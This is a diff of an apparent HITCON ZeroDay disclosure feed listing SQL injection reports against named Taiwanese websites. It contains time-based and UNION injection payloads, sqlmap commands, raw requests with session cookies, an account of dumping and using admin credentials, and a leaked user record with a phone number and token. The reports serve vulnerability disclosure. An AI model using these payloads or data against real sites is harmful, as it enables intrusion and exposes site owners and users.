@@ -24136,7 +25583,7 @@ Payload: site_map_item_id=478 AND (SELECT 2653 FROM (SELECT(SLEEP(5)))aVCj)</cod
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="2c7c6c5f5f5b1c5e48">
+      <span class="__cf_email__" data-cfemail="237363505054135147">
        [email protected]
       </span>
      </a>
@@ -24463,7 +25910,7 @@ Payload: id=-8507 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="f2a2b2818185c28096" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="dd8d9daeaeaaedafb9" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -24478,7 +25925,7 @@ Payload: id=-8507 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="3d6d7d4e4e4a0d4f59" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="633323101014531107" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -24493,7 +25940,7 @@ Payload: id=-8507 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
      </span>
      <span class="log-status">
       新提交 (由
-      <a class="__cf_email__" data-cfemail="e2b2a2919195d29086" href="/cdn-cgi/l/email-protection">
+      <a class="__cf_email__" data-cfemail="beeefecdcdc98eccda" href="/cdn-cgi/l/email-protection">
        [email protected]
       </a>
       更新此狀態)
@@ -24580,7 +26027,7 @@ Payload: id=-8507 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,
     <li>
      通報者：wucy0612 (
      <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="5e0e1e2d2d296e2c3a">
+      <span class="__cf_email__" data-cfemail="85d5c5f6f6f2b5f7e1">
        [email protected]
       </span>
      </a>
@@ -25482,7 +26929,7 @@ Payload: article_id=3' AND (SELECT 8120 FROM (SELECT(SLEEP(5)))KfVH)-- BrTO</cod
     </p>
     <p>
      {"list":[{"userid":"05076416_291","user_name":"lin","mail":"
-     <a class="__cf_email__" data-cfemail="a0ccc9ced3c8c9c8d4c9cec791999993e0c7cdc1c9cc8ec3cfcd" href="/cdn-cgi/l/email-protection">
+     <a class="__cf_email__" data-cfemail="f5999c9b869d9c9d819c9b92c4ccccc6b59298949c99db969a98" href="/cdn-cgi/l/email-protection">
       [email protected]
      </a>
      ","cell_phone_no":"0928807547","group_id":"Shengsong","token":"GR8GaUszO018sh3bZRumC1CaPNX4Ce6cHe6Zgci6LpA"}]}
@@ -26412,1439 +27859,4 @@ protocol=MGR_LOGIN&amp;jdata%5Bemail%5D=admin&amp;jdata%5Bpw%5D=admin</code></pr
   </div>
  </section>
 </div>
-</description><pubDate>Tue, 11 Jan 2022 17:55:37 GMT</pubDate></item><item><title>宇宙彌勒皇教 SQli</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00037</link><description><div class="container">
- <h2 class="always-not-there">
-  Vulnerability Detail Report
- </h2>
- <section class="vul-detail-section overview">
-  <h3 class="always-not-there">
-   Vulnerability Overview
-  </h3>
-  <div class="section-content overview">
-   <ul>
-    <li class="zdid col-risk-high-pseud-b">
-     <span class="label">
-      ZDID:
-     </span>
-     <span class="value">
-      ZD-2022-00037
-     </span>
-    </li>
-    <li class="vendor">
-     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/4169">
-      <i class="far fa-envelope">
-      </i>
-      發信
-     </a>
-     <span class="label">
-      Vendor:
-     </span>
-     <span class="value tx-overflow-ellipsis">
-      宇宙彌勒皇教
-     </span>
-    </li>
-    <li class="title">
-     <span class="label">
-      Title:
-     </span>
-     <span class="value">
-      宇宙彌勒皇教 SQli
-     </span>
-    </li>
-    <li class="intro">
-     <span class="label">
-      Introduction:
-     </span>
-     <span class="value">
-      Sqli
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   處理狀態
-  </h3>
-  <div class="section-content status">
-   <h4 class="always-not-there">
-    目前狀態
-   </h4>
-   <div class="status-label col-status-200-tx">
-    公開
-   </div>
-   <div class="status-descr">
-    Last Update : 2022/03/28
-   </div>
-   <ul class="zdui-status-timeline stat-tn-risk-high">
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       新提交
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已審核
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已通報
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node warning">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未回報修補狀況
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未複測
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       公開
-      </span>
-     </div>
-    </li>
-   </ul>
-   <h4 class="always-not-there">
-    處理歷程
-   </h4>
-   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
-   </div>
-   <ul class="status-log-list" id="vul-status-log-list">
-    <li>
-     <span class="log-date">
-      2022/01/12 18:40:58
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      新提交 (由 水皮 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/16 23:00:45
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:17:24
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      通報未回應 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:17:24
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:17:24
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      通報未回應 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/03/28 03:00:02
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      公開 (由 HITCON ZeroDay 平台自動更新)
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   詳細資料
-  </h3>
-  <div class="section-content info">
-   <ul>
-    <li>
-     ZDID：ZD-2022-00037
-    </li>
-    <li>
-     通報者：waterpeitw (
-     <a href="/user/waterpeitw">
-      水皮
-     </a>
-     )
-    </li>
-    <li>
-     風險：高
-    </li>
-    <li>
-     類型：資料庫注入攻擊 (SQL Injection)
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   參考資料
-  </h3>
-  <div class="section-content url">
-   <div>
-    攻擊者可利用該漏洞取得後端資料庫權限及完整資料（包含大量使用者個資或敏感性資料），同時也有機會對資料進行破壞或修改。
-    <br/>
-    <br/>
-    漏洞說明： OWASP - SQL Injection
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection
-    <br/>
-    <br/>
-    漏洞說明： OWASP - Top 10 - 2017 A1 - Injection
-    <br/>
-    https://www.owasp.org/index.php/Top_10-2017_A1-Injection
-    <br/>
-    <br/>
-    漏洞說明： CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
-    <br/>
-    https://cwe.mitre.org/data/definitions/89.html
-    <br/>
-    <br/>
-    防護方式： OWASP - SQL Injection Prevention Cheat Sheet
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
-   </div>
-   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
-    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   相關網址
-  </h3>
-  <div class="section-content url">
-   <div class="urls">
-    http://211.72.212.183/
-    <br/>
-    http://114.32.52.215/
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   敘述
-  </h3>
-  <div class="section-content zdui-md-content" id="detail">
-   <div>
-    <p>
-     sqlmap -r request --batch
-    </p>
-    <p>
-     request
-    </p>
-    <pre><code>POST /login.php HTTP/1.1
-Host: 114.32.52.215
-Content-Length: 14
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://114.32.52.215
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://114.32.52.215/login
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=pbg9m6rih20mt369830lmhdc10
-Connection: close
-
-account=a&amp;pw=a</code></pre>
-    <p>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7200/attachments/bedf323bc9bf5e113b07970f5a9ff94d"/>
-    </p>
-    <p>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7200/attachments/28fbedd28eb173a5c89affcce84d807b"/>
-    </p>
-    <p>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7200/attachments/2e295479bfce566c61411ae0c574ea93"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   擷圖
-  </h3>
-  <div class="section-content screenshot">
-   <ul>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7200/attachments/28fbedd28eb173a5c89affcce84d807b" width="320"/>
-     </span>
-    </li>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7200/attachments/bedf323bc9bf5e113b07970f5a9ff94d" width="320"/>
-     </span>
-    </li>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7200/attachments/2e295479bfce566c61411ae0c574ea93" width="320"/>
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   留言討論
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="comments-block" id="comments_block">
-    </div>
-    <div class="login-and-comment">
-     <a href="/auth/login">
-      登入後留言
-     </a>
-    </div>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   聯絡組織
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="input-comment">
-     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/4169">
-      <i class="far fa-envelope">
-      </i>
-      發送私人訊息
-     </a>
-     <div class="remind-text">
-      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
-     </div>
-    </div>
-   </div>
-  </div>
- </section>
-</div>
-</description><pubDate>Wed, 12 Jan 2022 18:40:58 GMT</pubDate></item><item><title>艾邁行銷網站管理系統 Sqli</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00031</link><description><div class="container">
- <h2 class="always-not-there">
-  Vulnerability Detail Report
- </h2>
- <section class="vul-detail-section overview">
-  <h3 class="always-not-there">
-   Vulnerability Overview
-  </h3>
-  <div class="section-content overview">
-   <ul>
-    <li class="zdid col-risk-high-pseud-b">
-     <span class="label">
-      ZDID:
-     </span>
-     <span class="value">
-      ZD-2022-00031
-     </span>
-    </li>
-    <li class="vendor">
-     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/4171">
-      <i class="far fa-envelope">
-      </i>
-      發信
-     </a>
-     <span class="label">
-      Vendor:
-     </span>
-     <span class="value tx-overflow-ellipsis">
-      艾邁行銷工作室
-     </span>
-    </li>
-    <li class="title">
-     <span class="label">
-      Title:
-     </span>
-     <span class="value">
-      艾邁行銷網站管理系統 Sqli
-     </span>
-    </li>
-    <li class="intro">
-     <span class="label">
-      Introduction:
-     </span>
-     <span class="value">
-      Sqli
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   處理狀態
-  </h3>
-  <div class="section-content status">
-   <h4 class="always-not-there">
-    目前狀態
-   </h4>
-   <div class="status-label col-status-200-tx">
-    公開
-   </div>
-   <div class="status-descr">
-    Last Update : 2022/03/27
-   </div>
-   <ul class="zdui-status-timeline stat-tn-risk-high">
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       新提交
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已審核
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已通報
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node warning">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未回報修補狀況
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未複測
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       公開
-      </span>
-     </div>
-    </li>
-   </ul>
-   <h4 class="always-not-there">
-    處理歷程
-   </h4>
-   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
-   </div>
-   <ul class="status-log-list" id="vul-status-log-list">
-    <li>
-     <span class="log-date">
-      2022/01/11 15:43:00
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      新提交 (由 水皮 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/16 23:02:43
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:19:33
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      通報未回應 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:19:33
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      通報未回應 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/03/27 03:00:11
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      公開 (由 HITCON ZeroDay 平台自動更新)
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   詳細資料
-  </h3>
-  <div class="section-content info">
-   <ul>
-    <li>
-     ZDID：ZD-2022-00031
-    </li>
-    <li>
-     通報者：waterpeitw (
-     <a href="/user/waterpeitw">
-      水皮
-     </a>
-     )
-    </li>
-    <li>
-     風險：高
-    </li>
-    <li>
-     類型：資料庫注入攻擊 (SQL Injection)
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   參考資料
-  </h3>
-  <div class="section-content url">
-   <div>
-    攻擊者可利用該漏洞取得後端資料庫權限及完整資料（包含大量使用者個資或敏感性資料），同時也有機會對資料進行破壞或修改。
-    <br/>
-    <br/>
-    漏洞說明： OWASP - SQL Injection
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection
-    <br/>
-    <br/>
-    漏洞說明： OWASP - Top 10 - 2017 A1 - Injection
-    <br/>
-    https://www.owasp.org/index.php/Top_10-2017_A1-Injection
-    <br/>
-    <br/>
-    漏洞說明： CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
-    <br/>
-    https://cwe.mitre.org/data/definitions/89.html
-    <br/>
-    <br/>
-    防護方式： OWASP - SQL Injection Prevention Cheat Sheet
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
-   </div>
-   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
-    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   相關網址
-  </h3>
-  <div class="section-content url">
-   <div class="urls">
-    http://www.isell.tw/Manage/aLogin
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   敘述
-  </h3>
-  <div class="section-content zdui-md-content" id="detail">
-   <div>
-    <p>
-     sqlmap -r request --batch
-    </p>
-    <p>
-     request
-    </p>
-    <pre><code>POST /WebServices/AJAXService.svc/CheckUserName HTTP/1.1
-Host: www.isell.tw
-Content-Length: 16
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
-X-Requested-With: XMLHttpRequest
-Content-Type: application/json; charset=UTF-8
-Accept: */*
-Origin: http://www.isell.tw
-Referer: http://www.isell.tw/Manage/aLogin
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: ASP.NET_SessionId=frfkudr5x2gznrho2pypfgrd; __AntiXsrfToken=307af4bd609a4deabedcfab04ddee210; UnbSSId=b4cbfa20-7086-4e06-a77b-7223c0eb4fd1; www__ops214812=OWXjutWiNI+AdgIgTYaL1ouVW6iBWaSHP4tO2q08OtgG5hADfzbq3PTJh3TRZ+vNdwpO4fgfpLAgJbEjU3CvTUQ+CnsM8IiqaNPqEJoBquwHuUEqYDVtLNm/gzVs/TdYhhpx6WT3I1kvA0O4InLjCjgTfPNmRX6ysEwXctWRbSDdyIJfAhw1dr6uELj1vE/tXvbjoUyDljy90JDYkZ9dBmbVEdmJQh1PgAWPh0Me/GcES+ikwhhiSkdz+Io1Q8BrqYSBYSBM709rveyaFpoLMw==
-Connection: close
-
-{"name":"admin"}</code></pre>
-    <p>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7194/attachments/a64f3e0da9c9df1aa70fdd3e2a4a8120"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   擷圖
-  </h3>
-  <div class="section-content screenshot">
-   <ul>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7194/attachments/a64f3e0da9c9df1aa70fdd3e2a4a8120" width="320"/>
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   留言討論
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="comments-block" id="comments_block">
-    </div>
-    <div class="login-and-comment">
-     <a href="/auth/login">
-      登入後留言
-     </a>
-    </div>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-cmnt">
-  <h3 class="sec-title">
-   聯絡組織
-  </h3>
-  <div class="section-content">
-   <div class="zdui-comment-block">
-    <div class="input-comment">
-     <a class="zdui-button okgo" href="/up/message/channel/create/vendor/4171">
-      <i class="far fa-envelope">
-      </i>
-      發送私人訊息
-     </a>
-     <div class="remind-text">
-      您也可以透過私人訊息的方式與組織聯繫，討論有關於這個漏洞的相關資訊。
-     </div>
-    </div>
-   </div>
-  </div>
- </section>
-</div>
-</description><pubDate>Tue, 11 Jan 2022 15:43:00 GMT</pubDate></item><item><title>Robotomas 築科機器人網站參數存在SQL injection</title><link>https://zeroday.hitcon.org/vulnerability/ZD-2022-00030</link><description><div class="container">
- <h2 class="always-not-there">
-  Vulnerability Detail Report
- </h2>
- <section class="vul-detail-section overview">
-  <h3 class="always-not-there">
-   Vulnerability Overview
-  </h3>
-  <div class="section-content overview">
-   <ul>
-    <li class="zdid col-risk-high-pseud-b">
-     <span class="label">
-      ZDID:
-     </span>
-     <span class="value">
-      ZD-2022-00030
-     </span>
-    </li>
-    <li class="vendor">
-     <a class="zdui-button send-message okgo" href="/up/message/channel/create/vendor/4172">
-      <i class="far fa-envelope">
-      </i>
-      發信
-     </a>
-     <span class="label">
-      Vendor:
-     </span>
-     <span class="value tx-overflow-ellipsis">
-      築科文教事業有限公司
-     </span>
-    </li>
-    <li class="title">
-     <span class="label">
-      Title:
-     </span>
-     <span class="value">
-      Robotomas 築科機器人網站參數存在SQL injection
-     </span>
-    </li>
-    <li class="intro">
-     <span class="label">
-      Introduction:
-     </span>
-     <span class="value">
-      網站參數存在SQL injection
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   處理狀態
-  </h3>
-  <div class="section-content status">
-   <h4 class="always-not-there">
-    目前狀態
-   </h4>
-   <div class="status-label col-status-200-tx">
-    公開
-   </div>
-   <div class="status-descr">
-    Last Update : 2022/03/27
-   </div>
-   <ul class="zdui-status-timeline stat-tn-risk-high">
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       新提交
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已審核
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       已通報
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node warning">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未回報修補狀況
-      </span>
-     </div>
-    </li>
-    <li class="non-stop">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       未複測
-      </span>
-     </div>
-    </li>
-    <li class="">
-     <div class="stat-tn-node">
-      <span class="stat-tn-date">
-      </span>
-      <span class="stat-tn-stat tx-overflow-ellipsis">
-       公開
-      </span>
-     </div>
-    </li>
-   </ul>
-   <h4 class="always-not-there">
-    處理歷程
-   </h4>
-   <div class="status-log" data-label-expand="點此顯示完整的處理歷程" data-label-fold="收合完整歷程" onclick="onClickToggleVulStatLog(event)">
-   </div>
-   <ul class="status-log-list" id="vul-status-log-list">
-    <li>
-     <span class="log-date">
-      2022/01/11 11:47:26
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      新提交 (由
-      <a class="__cf_email__" data-cfemail="570717242420672533" href="/cdn-cgi/l/email-protection">
-       [email protected]
-      </a>
-      更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/01/11 11:48:22
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      新提交 (由
-      <a class="__cf_email__" data-cfemail="fbabbb88888ccb899f" href="/cdn-cgi/l/email-protection">
-       [email protected]
-      </a>
-      更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/16 23:03:00
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:21:28
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      審核完成 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/02/18 17:21:28
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      通報未回應 (由 HITCON ZeroDay 服務團隊 更新此狀態)
-     </span>
-    </li>
-    <li>
-     <span class="log-date">
-      2022/03/27 03:00:09
-     </span>
-     <span class="always-not-there">
-      :
-     </span>
-     <span class="log-status">
-      公開 (由 HITCON ZeroDay 平台自動更新)
-     </span>
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   詳細資料
-  </h3>
-  <div class="section-content info">
-   <ul>
-    <li>
-     ZDID：ZD-2022-00030
-    </li>
-    <li>
-     通報者：wucy0612 (
-     <a href="/user/wucy0612">
-      <span class="__cf_email__" data-cfemail="90c0d0e3e3e7a0e2f4">
-       [email protected]
-      </span>
-     </a>
-     )
-    </li>
-    <li>
-     風險：高
-    </li>
-    <li>
-     類型：資料庫注入攻擊 (SQL Injection)
-    </li>
-   </ul>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   參考資料
-  </h3>
-  <div class="section-content url">
-   <div>
-    攻擊者可利用該漏洞取得後端資料庫權限及完整資料（包含大量使用者個資或敏感性資料），同時也有機會對資料進行破壞或修改。
-    <br/>
-    <br/>
-    漏洞說明： OWASP - SQL Injection
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection
-    <br/>
-    <br/>
-    漏洞說明： OWASP - Top 10 - 2017 A1 - Injection
-    <br/>
-    https://www.owasp.org/index.php/Top_10-2017_A1-Injection
-    <br/>
-    <br/>
-    漏洞說明： CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
-    <br/>
-    https://cwe.mitre.org/data/definitions/89.html
-    <br/>
-    <br/>
-    防護方式： OWASP - SQL Injection Prevention Cheat Sheet
-    <br/>
-    https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
-   </div>
-   <div align="right" class="section-content url" style="color: grey; margin-top: 20px">
-    (本欄位資訊由系統根據漏洞類別自動產生，做為漏洞參考資料。)
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section vu-d-url">
-  <h3 class="sec-title">
-   相關網址
-  </h3>
-  <div class="section-content url">
-   <div class="urls">
-    https://www.csrobot.com.tw/main/news2.php?id=%2032
-    <br/>
-    https://www.csrobot.com.tw/main/php/login.php
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   敘述
-  </h3>
-  <div class="section-content zdui-md-content" id="detail">
-   <div>
-    <p>
-     <a href="https://www.csrobot.com.tw/main/news2.php?id=%2032">
-      https://www.csrobot.com.tw/main/news2.php?id=%2032
-     </a>
-     <br/>
-     加上' 噴錯
-     <br/>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7193/attachments/d2e6f648cb56684a830c0423fa260405"/>
-    </p>
-    <p>
-     帶入 sqlmap
-     <br/>
-     Parameter: id (GET)
-     <br/>
-     current database: 'vhost134287'
-     <br/>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7193/attachments/00b042efa8ef693adb5d29c45bd88610"/>
-     <br/>
-     資料表
-     <br/>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7193/attachments/c8980e9deab6478c30938392fa1c2686"/>
-    </p>
-    <p>
-     管理者帳密
-     <br/>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7193/attachments/46380db52b7d7832c741374c57e156f0"/>
-    </p>
-    <p>
-     使用帳號及密碼可以成功登入
-     <br/>
-     <img alt="圖片" src="https://zeroday.hitcon.org/api/vulnerability/7193/attachments/fa68762bc92f8a6117eb02e68177c586"/>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   修補建議
-  </h3>
-  <div class="section-content zdui-md-content">
-   <p>
-    1.處理SQLI: 參數過濾及禁止
-    <br>
-     2.管理區非請勿入: 限制只有內網可以存取目錄
-     <br>
-      3.資料庫密碼欄位hash: 資料庫密碼欄位建議有加密儲存並加強密碼複雜度
-      <br>
-       4.弱密碼: 管理者帳號t**t為弱密碼(與帳號一樣)，強烈建議改掉
-       <br>
-        5.改善https://zeroday.hitcon.org/vulnerability/ZD-2021-00228
-       </br>
-      </br>
-     </br>
-    </br>
-   </p>
-  </div>
- </section>
- <section class="vul-detail-section">
-  <h3 class="sec-title">
-   擷圖
-  </h3>
-  <div class="section-content screenshot">
-   <ul>
-    <li>
-     <span>
-      <img src="/api/vulnerability/7193/attachments/fa68762bc92f8a6117eb02e68177c586" width="320"/>
